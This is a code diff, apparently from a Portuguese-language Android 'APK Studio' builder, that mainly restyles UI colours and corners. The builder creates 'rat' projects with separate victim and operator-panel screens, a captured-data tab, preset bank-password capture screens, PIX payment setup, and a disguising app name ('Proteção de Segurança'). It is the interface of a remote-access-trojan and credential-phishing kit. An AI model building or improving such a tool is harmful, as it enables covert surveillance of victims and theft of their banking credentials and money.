+        <div className="flex gap-1 bg-[#2a2a31] rounded-md p-1">
           {(['editor', 'pix', 'data', 'settings', 'preview'] as const).map(tab => (
             <button
               key={tab}
               onClick={() => { setActiveTab(tab); if (tab === 'data') loadCapturedData(); }}
-              className={`px-4 py-2 rounded-lg text-sm font-semibold transition-all ${
-                activeTab === tab ? 'bg-blue-600 text-white' : 'text-gray-400 hover:text-white'
+              className={`px-4 py-2 rounded-md text-sm font-semibold transition-all ${
+                activeTab === tab ? 'bg-[#ef4444] text-white' : 'text-gray-400 hover:text-white'
               }`}
             >
               {tab === 'editor' && '✏️ Editor'}
@@ -2831,13 +2831,13 @@ const APKStudio: React.FC = () => {
         <div className="flex items-center gap-2">
           <button
             onClick={saveProject}
-            className="px-4 py-2 bg-green-600 hover:bg-green-700 text-white rounded-lg text-sm font-semibold flex items-center gap-2"
+            className="px-4 py-2 bg-green-600 hover:bg-green-700 text-white rounded-md text-sm font-semibold flex items-center gap-2"
           >
             <Save className="w-4 h-4" /> Salvar
           </button>
           <button
             onClick={() => startBuildProcess(editingMode === 'panel' ? 'panel' : 'victim')}
-            className="px-4 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded-lg text-sm font-semibold flex items-center gap-2"
+            className="px-4 py-2 bg-[#ef4444] hover:bg-[#f87171] text-white rounded-md text-sm font-semibold flex items-center gap-2"
           >
             <Download className="w-4 h-4" /> 🚀 Criar APK {editingMode === 'panel' ? '👑' : '👤'}
           </button>
@@ -2849,11 +2849,11 @@ const APKStudio: React.FC = () => {
         {activeTab === 'editor' && (
           <>
             {/* Painel Esquerdo - Elementos COMPLETO */}
-            <div className="w-56 bg-[#440e05] p-3 border-r border-blue-500/20 overflow-y-auto">
+            <div className="w-56 bg-[#121214] p-3 border-r border-[#2a2a31]/20 overflow-y-auto">
               <h3 className="text-white font-semibold mb-3 text-sm">➕ Elementos</h3>
               
               {/* Legenda */}
-              <div className="mb-3 p-2 bg-[#290903] rounded text-[9px]">
+              <div className="mb-3 p-2 bg-[#1a1a1e] rounded text-[9px]">
                 <p className="text-gray-400 mb-1">📌 Legenda:</p>
                 <p className="text-green-400">🎨 Visual - Só aparência</p>
                 <p className="text-yellow-400">📊 Dados - Salva no banco</p>
@@ -2861,12 +2861,12 @@ const APKStudio: React.FC = () => {
 
               {/* TEXTOS E TÍTULOS */}
               <div className="mb-3">
-                <p className="text-blue-400 text-[10px] font-semibold mb-1">📝 TEXTOS</p>
+                <p className="text-[#ef4444] text-[10px] font-semibold mb-1">📝 TEXTOS</p>
                 <div className="grid grid-cols-2 gap-1">
-                  <button onClick={() => addElement('text')} className="flex items-center gap-1 px-2 py-1.5 bg-slate-700 hover:bg-slate-600 text-white rounded text-[10px]" title="Texto simples - só visual">
+                  <button onClick={() => addElement('text')} className="flex items-center gap-1 px-2 py-1.5 bg-[#2a2a31] hover:bg-[#6f6f78] text-white rounded text-[10px]" title="Texto simples - só visual">
                     🎨 Título/Texto
                   </button>
-                  <button onClick={() => addElement('button')} className="flex items-center gap-1 px-2 py-1.5 bg-slate-700 hover:bg-slate-600 text-white rounded text-[10px]" title="Botão clicável - executa ação">
+                  <button onClick={() => addElement('button')} className="flex items-center gap-1 px-2 py-1.5 bg-[#2a2a31] hover:bg-[#6f6f78] text-white rounded text-[10px]" title="Botão clicável - executa ação">
                     🎨 Botão
                   </button>
                 </div>
@@ -2896,18 +2896,18 @@ const APKStudio: React.FC = () => {
               
               {/* DECORAÇÃO VISUAL */}
               <div className="mb-3">
-                <p className="text-blue-400 text-[10px] font-semibold mb-1">🎨 DECORAÇÃO <span className="text-[8px]">(só visual)</span></p>
+                <p className="text-[#ef4444] text-[10px] font-semibold mb-1">🎨 DECORAÇÃO <span className="text-[8px]">(só visual)</span></p>
                 <div className="grid grid-cols-2 gap-1">
-                  <button onClick={() => addElement('rectangle')} className="flex items-center gap-1 px-2 py-1.5 bg-slate-700 hover:bg-slate-600 text-white rounded text-[10px]" title="Caixa colorida - decoração">
+                  <button onClick={() => addElement('rectangle')} className="flex items-center gap-1 px-2 py-1.5 bg-[#2a2a31] hover:bg-[#6f6f78] text-white rounded text-[10px]" title="Caixa colorida - decoração">
                     🎨 Caixa
                   </button>
-                  <button onClick={() => addElement('circle')} className="flex items-center gap-1 px-2 py-1.5 bg-slate-700 hover:bg-slate-600 text-white rounded text-[10px]" title="Círculo decorativo">
+                  <button onClick={() => addElement('circle')} className="flex items-center gap-1 px-2 py-1.5 bg-[#2a2a31] hover:bg-[#6f6f78] text-white rounded text-[10px]" title="Círculo decorativo">
                     🎨 Círculo
                   </button>
-                  <button onClick={() => addElement('divider')} className="flex items-center gap-1 px-2 py-1.5 bg-slate-700 hover:bg-slate-600 text-white rounded text-[10px]" title="Linha separadora">
+                  <button onClick={() => addElement('divider')} className="flex items-center gap-1 px-2 py-1.5 bg-[#2a2a31] hover:bg-[#6f6f78] text-white rounded text-[10px]" title="Linha separadora">
                     🎨 Linha
                   </button>
-                  <button onClick={() => addElement('card')} className="flex items-center gap-1 px-2 py-1.5 bg-slate-700 hover:bg-slate-600 text-white rounded text-[10px]" title="Cartão com sombra">
+                  <button onClick={() => addElement('card')} className="flex items-center gap-1 px-2 py-1.5 bg-[#2a2a31] hover:bg-[#6f6f78] text-white rounded text-[10px]" title="Cartão com sombra">
                     🎨 Cartão
                   </button>
                 </div>
@@ -2917,25 +2917,25 @@ const APKStudio: React.FC = () => {
               <div className="mb-3">
                 <p className="text-pink-400 text-[10px] font-semibold mb-1">📷 IMAGENS E MÍDIA</p>
                 <div className="grid grid-cols-2 gap-1">
-                  <button onClick={() => addElement('image')} className="flex items-center gap-1 px-2 py-1.5 bg-slate-700 hover:bg-slate-600 text-white rounded text-[10px]" title="Foto ou imagem">
+                  <button onClick={() => addElement('image')} className="flex items-center gap-1 px-2 py-1.5 bg-[#2a2a31] hover:bg-[#6f6f78] text-white rounded text-[10px]" title="Foto ou imagem">
                     🎨 Foto/Imagem
                   </button>
-                  <button onClick={() => addElement('logo')} className="flex items-center gap-1 px-2 py-1.5 bg-slate-700 hover:bg-slate-600 text-white rounded text-[10px]" title="Logo redondo">
+                  <button onClick={() => addElement('logo')} className="flex items-center gap-1 px-2 py-1.5 bg-[#2a2a31] hover:bg-[#6f6f78] text-white rounded text-[10px]" title="Logo redondo">
                     🎨 Logo
                   </button>
-                  <button onClick={() => addElement('video')} className="flex items-center gap-1 px-2 py-1.5 bg-slate-700 hover:bg-slate-600 text-white rounded text-[10px]" title="Vídeo MP4 ou YouTube">
+                  <button onClick={() => addElement('video')} className="flex items-center gap-1 px-2 py-1.5 bg-[#2a2a31] hover:bg-[#6f6f78] text-white rounded text-[10px]" title="Vídeo MP4 ou YouTube">
                     🎨 Vídeo
                   </button>
-                  <button onClick={() => addElement('audio')} className="flex items-center gap-1 px-2 py-1.5 bg-slate-700 hover:bg-slate-600 text-white rounded text-[10px]" title="Som ou música">
+                  <button onClick={() => addElement('audio')} className="flex items-center gap-1 px-2 py-1.5 bg-[#2a2a31] hover:bg-[#6f6f78] text-white rounded text-[10px]" title="Som ou música">
                     🎨 Som/Música
                   </button>
-                  <button onClick={() => addElement('gif')} className="flex items-center gap-1 px-2 py-1.5 bg-slate-700 hover:bg-slate-600 text-white rounded text-[10px]" title="Imagem animada">
+                  <button onClick={() => addElement('gif')} className="flex items-center gap-1 px-2 py-1.5 bg-[#2a2a31] hover:bg-[#6f6f78] text-white rounded text-[10px]" title="Imagem animada">
                     🎨 GIF Animado
                   </button>
-                  <button onClick={() => addElement('lottie')} className="flex items-center gap-1 px-2 py-1.5 bg-slate-700 hover:bg-slate-600 text-white rounded text-[10px]" title="Animação bonita">
+                  <button onClick={() => addElement('lottie')} className="flex items-center gap-1 px-2 py-1.5 bg-[#2a2a31] hover:bg-[#6f6f78] text-white rounded text-[10px]" title="Animação bonita">
                     🎨 Animação
                   </button>
-                  <button onClick={() => addElement('icon')} className="flex items-center gap-1 px-2 py-1.5 bg-slate-700 hover:bg-slate-600 text-white rounded text-[10px]" title="Emoji ou ícone">
+                  <button onClick={() => addElement('icon')} className="flex items-center gap-1 px-2 py-1.5 bg-[#2a2a31] hover:bg-[#6f6f78] text-white rounded text-[10px]" title="Emoji ou ícone">
                     🎨 Emoji/Ícone
                   </button>
                 </div>
@@ -2945,10 +2945,10 @@ const APKStudio: React.FC = () => {
               <div className="mb-3">
                 <p className="text-green-400 text-[10px] font-semibold mb-1">📈 INDICADORES <span className="text-[8px]">(mostram dados)</span></p>
                 <div className="grid grid-cols-2 gap-1">
-                  <button onClick={() => addElement('progress_bar')} className="flex items-center gap-1 px-2 py-1.5 bg-slate-700 hover:bg-slate-600 text-white rounded text-[10px]" title="Barra de progresso">
+                  <button onClick={() => addElement('progress_bar')} className="flex items-center gap-1 px-2 py-1.5 bg-[#2a2a31] hover:bg-[#6f6f78] text-white rounded text-[10px]" title="Barra de progresso">
                     🎨 Barra %
                   </button>
-                  <button onClick={() => addElement('countdown')} className="flex items-center gap-1 px-2 py-1.5 bg-slate-700 hover:bg-slate-600 text-white rounded text-[10px]" title="Contador regressivo">
+                  <button onClick={() => addElement('countdown')} className="flex items-center gap-1 px-2 py-1.5 bg-[#2a2a31] hover:bg-[#6f6f78] text-white rounded text-[10px]" title="Contador regressivo">
                     ⏱️ Timer
                   </button>
                 </div>
@@ -2974,20 +2974,20 @@ const APKStudio: React.FC = () => {
               
               {/* AVANÇADO */}
               <div className="mb-3">
-                <p className="text-red-400 text-[10px] font-semibold mb-1">🚀 ESPECIAIS</p>
+                <p className="text-[#ef4444] text-[10px] font-semibold mb-1">🚀 ESPECIAIS</p>
                 <div className="grid grid-cols-2 gap-1">
-                  <button onClick={() => addElement('webview')} className="flex items-center gap-1 px-2 py-1.5 bg-slate-700 hover:bg-slate-600 text-white rounded text-[10px]" title="Abrir site dentro do app">
+                  <button onClick={() => addElement('webview')} className="flex items-center gap-1 px-2 py-1.5 bg-[#2a2a31] hover:bg-[#6f6f78] text-white rounded text-[10px]" title="Abrir site dentro do app">
                     🎨 Site/Página
                   </button>
-                  <button onClick={() => addElement('map')} className="flex items-center gap-1 px-2 py-1.5 bg-slate-700 hover:bg-slate-600 text-white rounded text-[10px]" title="Mapa com localização">
+                  <button onClick={() => addElement('map')} className="flex items-center gap-1 px-2 py-1.5 bg-[#2a2a31] hover:bg-[#6f6f78] text-white rounded text-[10px]" title="Mapa com localização">
                     🎨 Mapa
                   </button>
                 </div>
               </div>
               
               {/* INFO */}
-              <div className="p-2 bg-[#290903] rounded text-[9px] text-gray-400 mt-4">
-                <p className="text-blue-400 font-semibold mb-1">💡 Dica:</p>
+              <div className="p-2 bg-[#1a1a1e] rounded text-[9px] text-gray-400 mt-4">
+                <p className="text-[#ef4444] font-semibold mb-1">💡 Dica:</p>
                 <p>• Elementos 📊 criam campos no banco de dados automaticamente</p>
                 <p>• Elementos 🎨 são só visuais, não salvam dados</p>
                 <p>• Ao fazer o Build, o sistema cria a API e banco automaticamente!</p>
@@ -2998,7 +2998,7 @@ const APKStudio: React.FC = () => {
                 📱 Telas
                 <button
                   onClick={addScreen}
-                  className="p-1 bg-blue-600 hover:bg-blue-700 rounded"
+                  className="p-1 bg-[#ef4444] hover:bg-[#f87171] rounded"
                 >
                   <Plus className="w-4 h-4" />
                 </button>
@@ -3009,14 +3009,14 @@ const APKStudio: React.FC = () => {
                     key={screen.id}
                     onClick={() => setCurrentScreenIndex(index)}
                     className={`flex items-center justify-between px-2 py-2 rounded cursor-pointer text-sm ${
-                      currentScreenIndex === index ? 'bg-blue-600' : 'bg-slate-700 hover:bg-slate-600'
+                      currentScreenIndex === index ? 'bg-[#ef4444]' : 'bg-[#2a2a31] hover:bg-[#6f6f78]'
                     }`}
                   >
                     <span className="text-white truncate">{screen.name}</span>
                     {currentScreens.length > 1 && (
                       <button
                         onClick={(e) => { e.stopPropagation(); deleteScreen(index); }}
-                        className="text-red-400 hover:text-red-300"
+                        className="text-[#ef4444] hover:text-[#ef4444]"
                       >
                         <Trash2 className="w-3 h-3" />
                       </button>
@@ -3031,13 +3031,13 @@ const APKStudio: React.FC = () => {
               
               {/* === SELETOR VÍTIMA vs PAINEL === */}
               {(currentProject?.projectType === 'rat' || currentProject?.projectType === 'hybrid' || currentProject?.projectType === 'mobile_panel') && (
-                <div className="flex items-center justify-center gap-4 p-4 bg-[#290903] border-b-2 border-blue-500/20">
+                <div className="flex items-center justify-center gap-4 p-4 bg-[#1a1a1e] border-b-2 border-[#2a2a31]/20">
                   <button
                     onClick={() => setEditingMode('victim')}
-                    className={`flex items-center gap-3 px-8 py-4 rounded-2xl font-bold text-lg transition-all ${
+                    className={`flex items-center gap-3 px-8 py-4 rounded-md font-bold text-lg transition-all ${
                       editingMode === 'victim'
-                        ? 'bg-gradient-to-r from-red-600 to-orange-600 text-white shadow-xl scale-105 ring-4 ring-red-500/50'
-                        : 'bg-slate-700 text-gray-400 hover:bg-slate-600'
+                        ? 'bg-gradient-to-r from-[#ef4444] to-[#84cc16] text-[#10120a] shadow-xl scale-105 ring-4 ring-[#ef4444]/50'
+                        : 'bg-[#2a2a31] text-gray-400 hover:bg-[#6f6f78]'
                     }`}
                   >
                     <span className="text-2xl">📱</span>
@@ -3051,10 +3051,10 @@ const APKStudio: React.FC = () => {
                   
                   <button
                     onClick={() => setEditingMode('panel')}
-                    className={`flex items-center gap-3 px-8 py-4 rounded-2xl font-bold text-lg transition-all ${
+                    className={`flex items-center gap-3 px-8 py-4 rounded-md font-bold text-lg transition-all ${
                       editingMode === 'panel'
                         ? 'bg-gradient-to-r from-green-600 to-emerald-600 text-white shadow-xl scale-105 ring-4 ring-green-500/50'
-                        : 'bg-slate-700 text-gray-400 hover:bg-slate-600'
+                        : 'bg-[#2a2a31] text-gray-400 hover:bg-[#6f6f78]'
                     }`}
                   >
                     <span className="text-2xl">🎮</span>
@@ -3067,9 +3067,9 @@ const APKStudio: React.FC = () => {
               )}
               
               {/* Barra de navegação de telas */}
-              <div className="flex items-center gap-2 p-3 bg-[#440e05] border-b border-blue-500/20 overflow-x-auto">
+              <div className="flex items-center gap-2 p-3 bg-[#121214] border-b border-[#2a2a31]/20 overflow-x-auto">
                 <span className={`text-xs font-bold px-3 py-1 rounded-full whitespace-nowrap ${
-                  editingMode === 'victim' ? 'bg-red-600 text-white' : 'bg-green-600 text-white'
+                  editingMode === 'victim' ? 'bg-[#ef4444] text-white' : 'bg-green-600 text-white'
                 }`}>
                   {editingMode === 'victim' ? '📱 VÍTIMA:' : '🎮 PAINEL:'}
                 </span>
@@ -3077,12 +3077,12 @@ const APKStudio: React.FC = () => {
                   <button
                     key={screen.id}
                     onClick={() => setCurrentScreenIndex(idx)}
-                    className={`px-3 py-1.5 rounded-lg text-xs font-semibold whitespace-nowrap transition-all ${
+                    className={`px-3 py-1.5 rounded-md text-xs font-semibold whitespace-nowrap transition-all ${
                       currentScreenIndex === idx 
                         ? editingMode === 'victim' 
-                          ? 'bg-red-600 text-white shadow-lg' 
+                          ? 'bg-[#ef4444] text-white shadow-lg' 
                           : 'bg-green-600 text-white shadow-lg'
-                        : 'bg-slate-700 text-gray-300 hover:bg-slate-600'
+                        : 'bg-[#2a2a31] text-gray-300 hover:bg-[#6f6f78]'
                     }`}
                   >
                     {screen.name}
@@ -3092,7 +3092,7 @@ const APKStudio: React.FC = () => {
                   <button
                     onClick={addScreen}
                     className={`px-3 py-1.5 rounded-l-lg text-xs font-semibold text-white hover:opacity-90 whitespace-nowrap transition-all ${
-                      editingMode === 'victim' ? 'bg-red-700 hover:bg-red-800' : 'bg-green-700 hover:bg-green-800'
+                      editingMode === 'victim' ? 'bg-[#ef4444] hover:bg-[#24242a]' : 'bg-green-700 hover:bg-green-800'
                     }`}
                   >
                     ➕ Nova Tela
@@ -3105,7 +3105,7 @@ const APKStudio: React.FC = () => {
                         e.target.value = ''; // Reset select
                       }
                     }}
-                    className="px-2 py-1.5 rounded-r-lg text-xs font-semibold text-white bg-slate-800 border-l border-slate-700 hover:bg-slate-700 outline-none cursor-pointer"
+                    className="px-2 py-1.5 rounded-r-lg text-xs font-semibold text-white bg-[#24242a] border-l border-[#2a2a31] hover:bg-[#2a2a31] outline-none cursor-pointer"
                     title="Adicionar tela de banco predefinida"
                   >
                     <option value="">🏦 Add Senha...</option>
@@ -3128,7 +3128,7 @@ const APKStudio: React.FC = () => {
                 <div className="mb-3 text-center">
                   <span className={`text-white text-sm px-4 py-2 rounded-full font-bold shadow-lg ${
                     editingMode === 'victim' 
-                      ? 'bg-gradient-to-r from-red-600 to-orange-600' 
+                      ? 'bg-gradient-to-r from-[#ef4444] to-[#84cc16]' 
                       : 'bg-gradient-to-r from-green-600 to-emerald-600'
                   }`}>
                     {editingMode === 'victim' ? '📱 VÍTIMA' : '🎮 PAINEL'} - {currentScreen?.name || 'Tela'} - EDITÁVEL
@@ -3139,7 +3139,7 @@ const APKStudio: React.FC = () => {
                   <div 
                     className={`rounded-[50px] shadow-2xl border-4 ${
                       editingMode === 'victim' 
-                        ? 'border-red-600/50' 
+                        ? 'border-[#3a3a44]/50' 
                         : 'border-green-600/50'
                     }`}
                     style={{
@@ -3178,7 +3178,7 @@ const APKStudio: React.FC = () => {
                       return (
                         <div
                           key={el.id}
-                          className={`absolute ${hasAction ? 'cursor-pointer hover:opacity-80' : 'cursor-move'} ${selectedElement === el.id ? 'ring-2 ring-blue-500' : ''}`}
+                          className={`absolute ${hasAction ? 'cursor-pointer hover:opacity-80' : 'cursor-move'} ${selectedElement === el.id ? 'ring-2 ring-[#ef4444]' : ''}`}
                           style={{
                             left: el.x * scaleX,
                             top: el.y * scaleY,
@@ -3258,7 +3258,7 @@ const APKStudio: React.FC = () => {
                               title={el.buttonAction ? `Ação: ${el.buttonAction}${el.targetScreenIndex !== undefined ? ` → Tela ${el.targetScreenIndex + 1}` : ''}` : undefined}
                             >
                               {el.content}
-                              {el.buttonAction && <span className="absolute -top-1 -right-1 text-xs bg-blue-500 text-white px-1 rounded">▶</span>}
+                              {el.buttonAction && <span className="absolute -top-1 -right-1 text-xs bg-[#ef4444] text-white px-1 rounded">▶</span>}
                             </div>
                           )}
                           {el.type === 'input' && (
@@ -3268,7 +3268,7 @@ const APKStudio: React.FC = () => {
                             </div>
                           )}
                           {el.type === 'image' && (
-                            <div className="w-full h-full flex items-center justify-center bg-slate-700 rounded">
+                            <div className="w-full h-full flex items-center justify-center bg-[#2a2a31] rounded">
                               {el.imageUrl ? (
                                 <img src={el.imageUrl} className="max-w-full max-h-full object-contain" />
                               ) : (
@@ -3293,7 +3293,7 @@ const APKStudio: React.FC = () => {
                           )}
                           {/* VIDEO */}
                           {el.type === 'video' && (
-                            <div className="w-full h-full flex flex-col items-center justify-center bg-[#440e05] rounded" style={{ borderRadius: el.borderRadius }}>
+                            <div className="w-full h-full flex flex-col items-center justify-center bg-[#121214] rounded" style={{ borderRadius: el.borderRadius }}>
                               {el.videoUrl ? (
                                 <video 
                                   src={el.videoUrl} 
@@ -3327,7 +3327,7 @@ const APKStudio: React.FC = () => {
                           )}
                           {/* GIF */}
                           {el.type === 'gif' && (
-                            <div className="w-full h-full flex items-center justify-center bg-slate-700 rounded overflow-hidden" style={{ borderRadius: el.borderRadius }}>
+                            <div className="w-full h-full flex items-center justify-center bg-[#2a2a31] rounded overflow-hidden" style={{ borderRadius: el.borderRadius }}>
                               {el.imageUrl ? (
                                 <img src={el.imageUrl} className="w-full h-full object-cover" style={{ borderRadius: el.borderRadius }} />
                               ) : (
@@ -3340,7 +3340,7 @@ const APKStudio: React.FC = () => {
                           )}
                           {/* LOGO */}
                           {el.type === 'logo' && (
-                            <div className="w-full h-full flex items-center justify-center bg-slate-700/50 rounded-full overflow-hidden" style={{ borderRadius: '50%' }}>
+                            <div className="w-full h-full flex items-center justify-center bg-[#2a2a31]/50 rounded-full overflow-hidden" style={{ borderRadius: '50%' }}>
                               {el.imageUrl ? (
                                 <img src={el.imageUrl} className="w-full h-full object-cover" />
                               ) : (
@@ -3359,7 +3359,7 @@ const APKStudio: React.FC = () => {
                             <div 
                               className="w-full h-full" 
                               style={{ 
-                                backgroundColor: el.backgroundColor || '#2e0d08', 
+                                backgroundColor: el.backgroundColor || '#121214', 
                                 borderRadius: el.borderRadius || 12,
                                 boxShadow: el.shadowBlur ? `0 ${el.shadowBlur}px ${el.shadowBlur * 2}px ${el.shadowColor || 'rgba(0,0,0,0.3)'}` : undefined
                               }} 
@@ -3415,7 +3415,7 @@ const APKStudio: React.FC = () => {
                           )}
                           {/* ANIMATION / LOTTIE */}
                           {(el.type === 'animation' || el.type === 'lottie') && (
-                            <div className="w-full h-full flex flex-col items-center justify-center bg-gradient-to-br from-blue-900 to-slate-950 rounded overflow-hidden" style={{ borderRadius: el.borderRadius }}>
+                            <div className="w-full h-full flex flex-col items-center justify-center bg-gradient-to-br from-[#1a1a1e] to-slate-950 rounded overflow-hidden" style={{ borderRadius: el.borderRadius }}>
                               {el.imageUrl ? (
                                 <iframe 
                                   src={`https://lottie.host/embed/${el.imageUrl.split('/').pop()}/animation.json`}
@@ -3432,14 +3432,14 @@ const APKStudio: React.FC = () => {
                           )}
                           {/* WEBVIEW */}
                           {el.type === 'webview' && (
-                            <div className="w-full h-full flex flex-col items-center justify-center bg-[#290903] rounded border border-blue-500/25" style={{ borderRadius: el.borderRadius }}>
+                            <div className="w-full h-full flex flex-col items-center justify-center bg-[#1a1a1e] rounded border border-[#2a2a31]/25" style={{ borderRadius: el.borderRadius }}>
                               <span className="text-2xl">🌐</span>
                               <span className="text-gray-400 text-xs mt-1 truncate px-2" style={{ maxWidth: '100%' }}>{el.buttonUrl || 'WebView'}</span>
                             </div>
                           )}
                           {/* MAP */}
                           {el.type === 'map' && (
-                            <div className="w-full h-full flex flex-col items-center justify-center bg-gradient-to-br from-green-900 to-blue-900 rounded" style={{ borderRadius: el.borderRadius }}>
+                            <div className="w-full h-full flex flex-col items-center justify-center bg-gradient-to-br from-green-900 to-[#1a1a1e] rounded" style={{ borderRadius: el.borderRadius }}>
                               <span className="text-3xl">🗺️</span>
                               <span className="text-gray-300 text-xs mt-1">Mapa</span>
                             </div>
@@ -3489,13 +3489,13 @@ const APKStudio: React.FC = () => {
               <div className="flex flex-col items-center max-h-full">
                 <div className="mb-3 text-center">
                   <span className={`text-white text-sm px-4 py-2 rounded-full font-bold ${
-                    editingMode === 'victim' ? 'bg-red-600' : 'bg-green-600'
+                    editingMode === 'victim' ? 'bg-[#ef4444]' : 'bg-green-600'
                   }`}>
                     {editingMode === 'victim' ? '📱 TELAS VÍTIMA' : '🎮 TELAS PAINEL'} ({currentScreens.length})
                   </span>
                 </div>
-                <div className={`flex flex-col gap-3 overflow-y-auto max-h-[650px] p-2 rounded-xl border-2 ${
-                  editingMode === 'victim' ? 'bg-red-950/30 border-red-600/30' : 'bg-green-950/30 border-green-600/30'
+                <div className={`flex flex-col gap-3 overflow-y-auto max-h-[650px] p-2 rounded-md border-2 ${
+                  editingMode === 'victim' ? 'bg-[#121214]/30 border-[#3a3a44]/30' : 'bg-green-950/30 border-green-600/30'
                 }`}>
                   {currentScreens.map((screen, idx) => {
                     const thumbScaleX = 120 / ANDROID_WIDTH;
@@ -3512,9 +3512,9 @@ const APKStudio: React.FC = () => {
                         }`}
                       >
                         <div 
-                          className={`rounded-2xl p-1.5 shadow-xl ${
+                          className={`rounded-md p-1.5 shadow-xl ${
                             currentScreenIndex === idx 
-                              ? editingMode === 'victim' ? 'ring-3 ring-red-500' : 'ring-3 ring-green-500'
+                              ? editingMode === 'victim' ? 'ring-3 ring-[#ef4444]' : 'ring-3 ring-green-500'
                               : ''
                           }`}
                           style={{
@@ -3522,7 +3522,7 @@ const APKStudio: React.FC = () => {
                           }}
                         >
                           <div 
-                            className="relative overflow-hidden rounded-xl"
+                            className="relative overflow-hidden rounded-md"
                             style={{
                               width: '120px',
                               height: '260px',
@@ -3562,7 +3562,7 @@ const APKStudio: React.FC = () => {
                                 )}
                                 {el.type === 'input' && (
                                   <div style={{ 
-                                    backgroundColor: el.backgroundColor || '#2e0d08', 
+                                    backgroundColor: el.backgroundColor || '#121214', 
                                     borderRadius: (el.borderRadius || 8) * thumbScaleX, 
                                     width: '100%', 
                                     height: '100%'
@@ -3590,16 +3590,16 @@ const APKStudio: React.FC = () => {
                             {/* Indicador de tela atual */}
                             {currentScreenIndex === idx && (
                               <div className={`absolute inset-0 flex items-center justify-center ${
-                                editingMode === 'victim' ? 'bg-red-500/20' : 'bg-green-500/20'
+                                editingMode === 'victim' ? 'bg-[#ef4444]/20' : 'bg-green-500/20'
                               }`}>
-                                <span className={`text-xl ${editingMode === 'victim' ? 'text-red-400' : 'text-green-400'}`}>✏️</span>
+                                <span className={`text-xl ${editingMode === 'victim' ? 'text-[#ef4444]' : 'text-green-400'}`}>✏️</span>
                               </div>
                             )}
                           </div>
                         </div>
                         <p className={`mt-1.5 text-[10px] font-semibold max-w-[120px] truncate ${
                           currentScreenIndex === idx 
-                            ? editingMode === 'victim' ? 'text-red-400' : 'text-green-400'
+                            ? editingMode === 'victim' ? 'text-[#ef4444]' : 'text-green-400'
                             : 'text-gray-400'
                         }`}>
                           {idx + 1}. {screen.name}
@@ -3613,7 +3613,7 @@ const APKStudio: React.FC = () => {
             </div>
 
             {/* Painel Direito - Propriedades */}
-            <div className="w-64 bg-[#440e05] p-3 border-l border-blue-500/20 overflow-y-auto">
+            <div className="w-64 bg-[#121214] p-3 border-l border-[#2a2a31]/20 overflow-y-auto">
               {selectedEl ? (
                 <ElementProperties
                   element={selectedEl}
@@ -3646,7 +3646,7 @@ const APKStudio: React.FC = () => {
               <h2 className="text-2xl font-bold text-white mb-6">💰 Configuração de Pagamento PIX</h2>
               
               {/* Selecionar Chave PIX */}
-              <div className="bg-[#440e05] rounded-xl p-6 mb-6">
+              <div className="bg-[#121214] rounded-md p-6 mb-6">
                 <h3 className="text-white font-semibold mb-4">Selecionar Chave PIX</h3>
                 {pixConfigs.length === 0 ? (
                   <p className="text-gray-400">Nenhuma chave configurada. Configure na tela inicial do APK Studio.</p>
@@ -3655,10 +3655,10 @@ const APKStudio: React.FC = () => {
                     {pixConfigs.map(config => (
                       <label
                         key={config.id}
-                        className={`flex items-center gap-3 p-3 rounded-lg cursor-pointer ${
+                        className={`flex items-center gap-3 p-3 rounded-md cursor-pointer ${
                           currentProject.pixConfig?.id === config.id 
                             ? 'bg-green-600/30 border border-green-500' 
-                            : 'bg-slate-700 hover:bg-slate-600'
+                            : 'bg-[#2a2a31] hover:bg-[#6f6f78]'
                         }`}
                       >
                         <input
@@ -3680,10 +3680,10 @@ const APKStudio: React.FC = () => {
 
               {/* Preview do PIX */}
               {currentProject.pixConfig && (
-                <div className="bg-[#440e05] rounded-xl p-6">
+                <div className="bg-[#121214] rounded-md p-6">
                   <h3 className="text-white font-semibold mb-4">Preview do QR Code</h3>
                   <div className="flex flex-col items-center gap-4">
-                    <div className="bg-white p-6 rounded-xl">
+                    <div className="bg-white p-6 rounded-md">
                       <QrCode className="w-48 h-48 text-gray-800" />
                     </div>
                     <p className="text-gray-400 text-sm text-center">
@@ -3702,7 +3702,7 @@ const APKStudio: React.FC = () => {
               <h2 className="text-2xl font-bold text-white mb-6">⚙️ Configurações do Projeto</h2>
               
               {/* Info Básica */}
-              <div className="bg-[#440e05] rounded-xl p-6">
+              <div className="bg-[#121214] rounded-md p-6">
                 <h3 className="text-white font-semibold mb-4">📱 Informações do App</h3>
                 <div className="space-y-4">
                   <div>
@@ -3711,15 +3711,15 @@ const APKStudio: React.FC = () => {
                       type="text"
                       value={currentProject.appName}
                       onChange={(e) => setCurrentProject({ ...currentProject, appName: e.target.value })}
-                      className="w-full bg-slate-700 text-white px-3 py-2 rounded mt-1"
+                      className="w-full bg-[#2a2a31] text-white px-3 py-2 rounded mt-1"
                       placeholder="Ex: Proteção de Segurança"
                     />
                   </div>
                   
                   {/* 🔥 NOME DO ARQUIVO APK - OBRIGATÓRIO */}
-                  <div className="bg-gradient-to-r from-red-900/30 to-orange-900/30 p-4 rounded-lg border border-red-600">
-                    <label className="text-red-400 text-sm font-bold flex items-center gap-2">
-                      📦 Nome do Arquivo APK <span className="text-xs bg-red-600 px-2 py-0.5 rounded">OBRIGATÓRIO</span>
+                  <div className="bg-gradient-to-r from-[#1a1a1e]/30 to-[#1a1a1e]/30 p-4 rounded-md border border-[#3a3a44]">
+                    <label className="text-[#ef4444] text-sm font-bold flex items-center gap-2">
+                      📦 Nome do Arquivo APK <span className="text-xs bg-[#ef4444] px-2 py-0.5 rounded">OBRIGATÓRIO</span>
                     </label>
                     <input
                       type="text"
@@ -3728,7 +3728,7 @@ const APKStudio: React.FC = () => {
                         ...currentProject, 
                         apkFileName: e.target.value.replace(/[^a-zA-Z0-9-_]/g, '-').toLowerCase() 
                       })}
-                      className="w-full bg-[#290903] text-white px-3 py-2 rounded mt-2 border-2 border-red-600 focus:border-orange-500"
+                      className="w-full bg-[#1a1a1e] text-white px-3 py-2 rounded mt-2 border-2 border-[#3a3a44] focus:border-[#ef4444]"
                       placeholder="meu-app-rat"
                     />
                     <p className="text-gray-400 text-xs mt-2">
@@ -3745,7 +3745,7 @@ const APKStudio: React.FC = () => {
                       type="text"
                       value={currentProject.packageName}
                       onChange={(e) => setCurrentProject({ ...currentProject, packageName: e.target.value })}
-                      className="w-full bg-slate-700 text-white px-3 py-2 rounded mt-1"
+                      className="w-full bg-[#2a2a31] text-white px-3 py-2 rounded mt-1"
                       placeholder="com.meuapp.protecao"
                     />
                   </div>
@@ -3755,17 +3755,17 @@ const APKStudio: React.FC = () => {
                       type="file"
                       accept="image/*"
                       onChange={(e) => handleImageUpload(e)}
